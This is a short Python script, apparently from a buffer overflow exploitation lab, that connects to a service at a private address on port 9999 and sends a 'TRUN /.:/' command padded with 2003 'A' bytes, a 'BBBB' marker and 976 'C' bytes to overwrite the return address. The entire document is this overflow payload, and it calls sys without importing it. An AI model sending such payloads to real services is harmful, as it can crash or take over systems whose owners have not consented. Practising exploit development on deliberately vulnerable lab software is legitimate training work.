import socket

length = 2992

try: 

    offset = 2003

    s = socket.socket()
    s.connect( ("192.168.168.11", 9999) )

    payload = [
        b"TRUN /.:/",
        b"A" * offset,
        b"BBBB",
        b"C" * 976
    ]

    payload = b"".join(payload)

    s.send(payload)
    s.close()
    
except:
    print("Could not connect to the target server")
    sys.exit(1)    
